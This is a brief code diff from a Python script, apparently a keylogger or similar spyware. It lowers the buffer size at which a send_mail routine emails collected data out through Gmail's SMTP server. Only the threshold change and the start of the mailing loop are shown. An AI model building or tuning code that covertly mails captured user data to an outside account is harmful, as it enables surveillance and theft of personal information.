@@ -35,7 +35,7 @@ if not path.isfile(dir):
 def send_mail():
     global data
     while True:
-        if len(data) > 30:
+        if len(data) > 10:
             timeInSecs = datetime.datetime.now()
             SERVER = "smtp.gmail.com"
             PORT = 587
